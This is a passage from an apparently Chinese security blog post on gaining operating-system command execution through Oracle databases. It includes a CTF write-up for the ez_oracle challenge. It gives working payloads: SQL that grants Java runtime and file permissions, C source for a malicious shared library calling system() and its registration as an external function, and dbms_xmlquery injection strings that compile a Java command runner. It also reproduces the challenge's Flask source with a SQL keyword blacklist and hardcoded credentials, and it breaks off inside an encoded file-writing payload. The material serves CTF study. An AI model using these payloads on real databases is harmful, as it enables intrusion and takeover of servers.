class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;writeFileDescriptor&#x27;</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>,<span class="keyword">USER</span>(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;readFileDescriptor&#x27;</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure><p>上述3个语句分别对应3个赋值，一般假如是DBA的话用第一个语句就可以了，我们只缺少FilePermission，假如有别的会在报错信息中显示，我们只要添加对应权限即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702479511816-798232c3-3625-4b48-8330-42cfb4a29bb1.png#averageHue=%234e525c&clientId=u41a8b913-b9c9-4&from=paste&height=306&id=u9fe862dc&originHeight=306&originWidth=1167&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=497004&status=done&style=none&taskId=u97831d9a-94c6-4e45-beb8-22de73d169f&title=&width=1167" alt="image.png"><br>上述所讲到的也就是Oracle中命令执行的核心了，即调用任意Java代码，</p><h1 id="Lib-加载"><a href="#Lib-加载" class="headerlink" title="Lib 加载"></a>Lib 加载</h1><p>oracle也可以和mysql一样加载一个so文件，因此这里其实也有命令执行的隐患，我们可以如此命令执行。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702520812181-3b137f6b-0200-43a6-a47f-98f839e8c8c3.png#averageHue=%23f9f8f8&clientId=u41a8b913-b9c9-4&from=paste&height=428&id=ud4c3fda9&originHeight=535&originWidth=1239&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48816&status=done&style=none&taskId=u928b1158-66d4-4499-ac2c-2396b9114da&title=&width=991.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702520818847-6c8bcfbf-01ef-40b2-a192-76dd5cc74b53.png#averageHue=%23fbfaf9&clientId=u41a8b913-b9c9-4&from=paste&height=724&id=ucf67752a&originHeight=905&originWidth=1679&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70343&status=done&style=none&taskId=u46b186fe-e9d2-472e-9a6b-f87128c33d8&title=&width=1343.2" alt="image.png"><br>官方文档中也是给出了我们如何添加第三方lib的方法。我们首先需要自己编译生成一个恶意so文件。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;evil.h&quot;</span></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char* cmd(char* command) &#123;</span><br><span class="line"><span class="keyword">system</span>(command);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>evil.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> evil_h_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> evil_h_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>* <span class="title function_">cmd</span><span class="params">(<span class="type">char</span>* command)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后将其编译为恶意的so文件。<br><code>gcc -shared -fPIC evil.c -o evil.so</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702522344525-0d990363-5f8f-4008-9ece-a425193c8a5a.png#averageHue=%230e0a07&clientId=u41a8b913-b9c9-4&from=paste&height=108&id=u66fba3c2&originHeight=135&originWidth=742&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17478&status=done&style=none&taskId=u6c46e5f2-c0c7-451b-871e-aeb4bfb7127&title=&width=593.6" alt="image.png"><br>之后我们和上述说的Java source的创建方式一样，创建一个Lib</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace library lib_evil <span class="keyword">as</span> <span class="string">&#x27;/home/oracle/evil.so&#x27;</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702522440258-ff118353-e7ec-4dec-9195-4271d6e20480.png#averageHue=%23010000&clientId=u41a8b913-b9c9-4&from=paste&height=86&id=fK7hQ&originHeight=107&originWidth=623&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3612&status=done&style=none&taskId=u4c4da8da-81ec-4ca8-bf73-881f3710f6b&title=&width=498.4" alt="image.png"><br>成功创建Lib后也是创建一个function，以lib里的代码为模板，这里参考一下网址<br><a href="https://medium.com/codex/extending-the-sql-and-pl-sql-with-custom-external-functions-and-procedures-214067761061">https://medium.com/codex/extending-the-sql-and-pl-sql-with-custom-external-functions-and-procedures-214067761061</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">function</span> cmd(str varchar2) <span class="keyword">return</span> varchar2 <span class="keyword">as</span> <span class="keyword">language</span> c library lib_evil name &quot;cmd&quot;;</span><br></pre></td></tr></table></figure><p>创建好后直接运行会出现如下情况<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702539982623-d7af05c7-97a3-4056-9476-51fe11ffbfd8.png#averageHue=%23020100&clientId=ua980496e-4f1f-4&from=paste&height=169&id=ua6aaa2fd&originHeight=169&originWidth=668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12579&status=done&style=none&taskId=ud6fe24bb-ad18-4eb1-8fe5-405fcac9a2d&title=&width=668" alt="image.png"><br>报错Extproc agent:Invalid DLL Path，这一点上述文章中有提到，我们需要设置一下dll path<br>我们在<code>$ORACLE_HOME/hs/admin/extproc.ora</code>文件的末尾加上一行代码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702540577363-50ced85f-65d6-4668-8587-6f52a0f4a654.png#averageHue=%23020000&clientId=ua980496e-4f1f-4&from=paste&height=813&id=udfc35664&originHeight=813&originWidth=1152&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69186&status=done&style=none&taskId=ufb1c0e38-1390-4d4e-8eb1-ba2d5b777ca&title=&width=1152" alt="image.png"><br>这样设置完后我们再次执行系统命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702540605126-9d6de59f-6ca6-4dfa-91e9-3168df01e572.png#averageHue=%23010000&clientId=ua980496e-4f1f-4&from=paste&height=162&id=u26fef4d9&originHeight=162&originWidth=951&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10534&status=done&style=none&taskId=uef934d04-a905-4bb0-8514-43576474068&title=&width=951" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702540610800-74318b2b-74f3-48d9-a307-35ca83d2d184.png#averageHue=%23302f2e&clientId=ua980496e-4f1f-4&from=paste&height=253&id=ua6029518&originHeight=253&originWidth=767&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30694&status=done&style=none&taskId=u8097ad0b-cd8d-48c0-978a-ac0f5bf2ee1&title=&width=767" alt="image.png"><br>成功的执行了系统命令</p><h1 id="Oracle-注入下的RCE"><a href="#Oracle-注入下的RCE" class="headerlink" title="Oracle 注入下的RCE"></a>Oracle 注入下的RCE</h1><p>上述介绍的<code>Java Source</code>、<code>Function</code>、<code>Lib</code>是RCE的几个原理，那在实际环境中，我们从外部注入，只能执行单条语句的时候，我们该怎么办呢？</p><h2 id="dbms-xmlquery"><a href="#dbms-xmlquery" class="headerlink" title="dbms_xmlquery"></a>dbms_xmlquery</h2><p>影响版本：oracle 10g、11g，部分版本<br>这里我的环境是11.0.2.0版本。<br>在上述低版本中这个函数才可以进行RCE，高版本都被修复了，这个函数本身是用来解析一段XML内容的，但是可以用来执行我们的SQL指令，可以把多条语句一起执行，起到多语句执行的目的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545222213-df63a031-f216-4006-8d3b-8283d90963e2.png#averageHue=%23565a63&clientId=ud8860e01-061f-4&from=paste&height=334&id=u88888559&originHeight=334&originWidth=1159&originalType=binary&ratio=1&rotation=0&showTitle=false&size=572884&status=done&style=none&taskId=u1c3aeec4-9c21-413c-a6ba-020119e8a0b&title=&width=1159" alt="image.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545234749-e438d004-3a56-4fb1-b57c-c0156e61084e.png#averageHue=%23575b63&clientId=ud8860e01-061f-4&from=paste&height=184&id=uf15e6874&originHeight=184&originWidth=1179&originalType=binary&ratio=1&rotation=0&showTitle=false&size=318636&status=done&style=none&taskId=u9d11e1c4-58d9-4a88-8d09-d3ed8756b9e&title=&width=1179" alt="image.png"><br>然后可以查询一下object是否存在</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> OBJECT_ID <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="operator">=</span><span class="string">&#x27;LINXRUNCMD&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545255864-2b1fb29b-a082-4818-9608-553bec1d41c9.png#averageHue=%23474b55&clientId=ud8860e01-061f-4&from=paste&height=138&id=ufeb07621&originHeight=138&originWidth=930&originalType=binary&ratio=1&rotation=0&showTitle=false&size=181963&status=done&style=none&taskId=u7b37e694-6946-48b7-b421-6bf83f0dcd0&title=&width=930" alt="image.png"><br>最后直接命令执行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545276905-058275bc-94e8-4714-80cc-52d11fc796d9.png#averageHue=%234a4e58&clientId=ud8860e01-061f-4&from=paste&height=243&id=ud303b32d&originHeight=243&originWidth=887&originalType=binary&ratio=1&rotation=0&showTitle=false&size=311703&status=done&style=none&taskId=uf8403591-d0e6-4abd-a8e4-d75100f9734&title=&width=887" alt="image.png"></p><h2 id="sql-storage"><a href="#sql-storage" class="headerlink" title="sql storage"></a>sql storage</h2><p>这个方法其实就是和sh文件一样，把多个语句放到一个sql文件，然后让oracle执行。也就是说我们需要有一个任意文件写入的点位<br>permission.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> </span><br><span class="line"><span class="string">&#x27;GRANT&#x27;</span>,<span class="keyword">USER</span>(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.io.FilePermission&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>,<span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure><p>rce.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">and</span> resolve java source named &quot;oraexec&quot; <span class="keyword">as</span></span><br><span class="line">import java.lang.<span class="operator">*</span>;</span><br><span class="line">import java.io.<span class="operator">*</span>;</span><br><span class="line">public class oraexec</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">static</span> String execCommand(String command) throws IOException, InterruptedException &#123;</span><br><span class="line">        Runtime rt <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">int</span> bufSize <span class="operator">=</span> <span class="number">4096</span>;</span><br><span class="line">        byte buffer[] <span class="operator">=</span> <span class="keyword">new</span> byte[bufSize];</span><br><span class="line">        String rc <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        try&#123;</span><br><span class="line">            Process p <span class="operator">=</span> rt.exec(command);</span><br><span class="line">            BufferedInputStream bis <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> BufferedInputStream(p.getInputStream(), bufSize);</span><br><span class="line">            while ((len <span class="operator">=</span> bis.read(buffer, <span class="number">0</span>, bufSize)) <span class="operator">!=</span> <span class="number">-1</span>)&#123;</span><br><span class="line">                rc <span class="operator">+</span><span class="operator">=</span> <span class="keyword">new</span> String(buffer).split(&quot;\0&quot;)[<span class="number">0</span>];;</span><br><span class="line">            &#125;</span><br><span class="line">            bis.close();</span><br><span class="line">            p.waitFor();</span><br><span class="line">            <span class="keyword">return</span> rc;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            rc <span class="operator">=</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        finally</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> rc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace</span><br><span class="line"><span class="keyword">function</span> javae(p_command <span class="keyword">in</span> varchar2) <span class="keyword">return</span> varchar2</span><br><span class="line"><span class="keyword">as</span></span><br><span class="line"><span class="keyword">language</span> java</span><br><span class="line">name <span class="string">&#x27;oraexec.execCommand(java.lang.String) return String&#x27;</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure><p>把这两个文件放到一个位置<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545759967-1d18cdc2-b886-4ce4-9fac-4ef78d395365.png#averageHue=%23000000&clientId=ud8860e01-061f-4&from=paste&height=259&id=u061d6745&originHeight=259&originWidth=587&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7298&status=done&style=none&taskId=u12d9a4e8-aea3-4f61-b7fa-107ea51ef3b&title=&width=587" alt="image.png"><br>最后就直接rce了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545791578-425799eb-ad7b-4c3d-8169-1285b2f4ae10.png#averageHue=%23010000&clientId=ud8860e01-061f-4&from=paste&height=150&id=u87ae72a4&originHeight=150&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4774&status=done&style=none&taskId=udc5f358a-8921-42b5-9780-b776ae14bf0&title=&width=666" alt="image.png"></p><h2 id="dbms-java-runjava-x2F-dbms-java-test-funcall"><a href="#dbms-java-runjava-x2F-dbms-java-test-funcall" class="headerlink" title="dbms_java.runjava&#x2F;dbms_java_test_funcall"></a>dbms_java.runjava&#x2F;dbms_java_test_funcall</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 11g</span></span><br><span class="line"><span class="keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="string">&#x27;oracle/aurora/util/Wrapper touch /tmp/success&#x27;</span>) <span class="keyword">FROM</span> DUAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 10g/11g, 注意10g中还需要readFileDescriptor和writeFileDescriptor</span></span><br><span class="line"><span class="keyword">SELECT</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="string">&#x27;main&#x27;</span>,<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;/sbin/ifconfig&gt;/tmp/1.txt&#x27;</span>) <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure><p>当然这几种我都无法实现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545989674-08ed8e21-4ed0-4473-8435-65bb1fa1c847.png#averageHue=%234e525c&clientId=u3d325f29-e042-4&from=paste&height=426&id=uca8799c9&originHeight=426&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=706840&status=done&style=none&taskId=u0d22bad9-4dce-4dac-898c-c66707285e8&title=&width=1181" alt="image.png"><br>提示没有wrapper类，说明还是少了什么文件的。</p><h1 id="京麒CTF-2023-ez-oracle"><a href="#京麒CTF-2023-ez-oracle" class="headerlink" title="[京麒CTF 2023] ez_oracle"></a>[京麒CTF 2023] ez_oracle</h1><p>参考：<a href="https://exp10it.cn/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup/#ez_oracle">https://exp10it.cn/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup&#x2F;#ez_oracle</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> oracledb</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">username = <span class="string">&quot;system&quot;</span></span><br><span class="line">password = <span class="string">&quot;PaAasSSsSwoRrRDd&quot;</span></span><br><span class="line">ol_server = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">ol_port = <span class="number">1521</span></span><br><span class="line">sid = <span class="string">&quot;orcl&quot;</span></span><br><span class="line">dsn = <span class="string">&quot;&#123;&#125;:&#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ol_server, ol_port, sid)</span><br><span class="line">logging.basicConfig(level=logging.INFO, filename=<span class="string">&#x27;/var/log/web.log&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">sql</span>):</span><br><span class="line">    blacklist = [<span class="string">&quot;select&quot;</span>, <span class="string">&quot;insert&quot;</span>, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;table&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;alert&quot;</span>, <span class="string">&quot;procedure&quot;</span>, <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;open&quot;</span>, <span class="string">&quot;:=&quot;</span>, <span class="string">&quot;declare&quot;</span>, <span class="string">&quot;runtime&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;newinstance&quot;</span>, <span class="string">&quot;parse&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;.class&quot;</span>, <span class="string">&quot;loader&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&quot;xml&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;field&quot;</span>, <span class="string">&quot;reflect&quot;</span>, <span class="string">&quot;defineclass&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;getclass&quot;</span>, <span class="string">&quot;forname&quot;</span>, <span class="string">&quot;constructor&quot;</span>, <span class="string">&quot;transform&quot;</span>, <span class="string">&quot;sql&quot;</span>, <span class="string">&quot;beans&quot;</span>, <span class="string">&quot;.net&quot;</span>, <span class="string">&quot;http&quot;</span>, <span class="string">&quot;.rmi&quot;</span>, <span class="string">&quot;naming&quot;</span></span><br><span class="line">                 ]</span><br><span class="line">    sql = sql.lower()</span><br><span class="line">    <span class="keyword">for</span> blackword <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> blackword <span class="keyword">in</span> sql:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">ip, sql, error=<span class="literal">None</span></span>):</span><br><span class="line">    error_text = <span class="string">&quot;-----------------------&#123;&#125;-----------------------\n&quot;</span>.<span class="built_in">format</span>(ip)</span><br><span class="line">    error_text += <span class="string">&quot;sql: &#123;&#125; \n&quot;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">    <span class="keyword">if</span> error != <span class="literal">None</span>:</span><br><span class="line">        error_text += <span class="string">&quot;error: &#123;&#125; \n&quot;</span>.<span class="built_in">format</span>(error)</span><br><span class="line">    error_text += <span class="string">&quot;-------------------------------------------------&quot;</span></span><br><span class="line">    logging.error(error_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/query&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>():</span><br><span class="line">    sql = request.form[<span class="string">&quot;sql&quot;</span>]</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> check(sql):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = oracledb.connect(user=username, password=password, dsn=dsn)</span><br><span class="line">            conn.callTimeout = <span class="number">5000</span></span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(sql)</span><br><span class="line">            cursor.close()</span><br><span class="line">            conn.close()</span><br><span class="line">            log(ip, sql)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log(ip, sql, e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;query success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目就是这样，一个oracle注入，做了一些过滤，然后是任意sql语句执行。然后这一题首先我们是不可以使用任何Java代码中的RCE函数。首先oralce内置的jdk好像是1.6，其次题目waf中过滤了所有命令执行函数，因此是行不通的（System.load确实也不可以)<br>那么这一题的思路其实就回到了之前讲到的lib 加载了，和mysql的udf提权有点类似，写一个恶意so进去，然后给他注册了。<br>首先创建Java Source，创建起来，可以看到后台是创建成功了的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sql=create <span class="keyword">or</span> replace <span class="keyword">and</span> compile java source named <span class="string">&quot;JavaTool&quot;</span> <span class="keyword">as</span></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.util.zip.GZIPInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaTool</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> String <span class="title function_ invoke__">write</span>(String path) throws <span class="built_in">Exception</span> &#123;</span><br><span class="line">        byte[] data = <span class="keyword">new</span> byte[]&#123;<span class="number">31</span>, -<span class="number">117</span>, <span 